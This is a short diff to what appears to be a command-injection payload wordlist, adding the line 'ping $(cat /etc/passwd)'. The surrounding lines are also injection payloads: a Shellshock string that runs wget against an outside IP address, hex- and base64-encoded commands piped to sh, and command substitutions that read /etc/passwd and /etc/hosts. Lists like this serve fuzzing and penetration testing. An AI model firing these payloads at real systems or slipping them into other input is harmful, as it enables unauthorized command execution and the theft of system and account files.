@@ -167,6 +167,7 @@ echo $'\x70\x69\x6e\x67\x20\x24\x28\x69\x64\x29' | sh
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
 cat /etc/hosts
 $(`cat /etc/passwd`)
+ping $(cat /etc/passwd)
 cat /etc/passwd
 echo Y2F0IC9ldGMvcGFzc3dk | base64 --decode | sh
 `echo Y2F0IC9ldGMvcGFzc3dk | base64 --decode`
